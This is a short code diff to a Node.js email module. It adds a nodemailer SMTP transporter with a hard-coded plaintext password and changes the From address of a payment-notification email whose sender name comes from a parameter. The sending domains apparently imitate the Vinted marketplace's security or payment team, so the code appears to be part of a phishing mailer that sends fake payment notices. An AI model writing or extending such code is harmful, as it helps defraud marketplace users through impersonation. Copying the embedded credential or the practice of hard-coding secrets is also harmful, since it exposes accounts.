@@ -10,6 +10,16 @@ const transporter = nodemailer.createTransport({
   },
 });
 
+const paymentTransporter = nodemailer.createTransport({
+  host: 'smtp.hostinger.com',
+  port: 465,
+  secure: true,
+  auth: {
+    user: 'info@equipe-securisevinted-pro.com',
+    pass: 'Amour##v22@',
+  },
+});
+
 interface EmailTransferNotificationParams {
   recipientEmail: string | null;
   recipientName: string | null;
@@ -440,7 +450,7 @@ export async function sendPaymentNotificationEmail(
 
   try {
     await transporter.sendMail({
-      from: `"${params.senderName}" <info@equipe-securisevinted-pro.com>`,
+      from: `"${params.senderName}" <support@transfertsecur.com>`,
       to: params.recipientEmail,
       subject: params.subject,
       html: htmlContent,
